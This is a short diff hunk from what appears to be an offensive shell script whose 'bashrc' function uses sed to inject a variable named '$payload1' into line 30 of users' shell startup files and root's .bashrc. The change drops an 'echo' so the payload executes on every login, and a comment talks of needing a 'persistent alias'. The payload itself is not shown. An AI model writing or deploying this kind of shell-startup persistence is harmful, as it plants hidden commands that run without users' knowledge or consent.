@@ -46,7 +46,7 @@ bashrc(){
         sed -is "30 a $payload1" $i
     done
 
-    sed -i "30 a echo $payload1" /root/.bashrc
+    sed -i "30 a $payload1" /root/.bashrc
 }
 
 # Need persistent alias. Right now, this doesn't do anything 
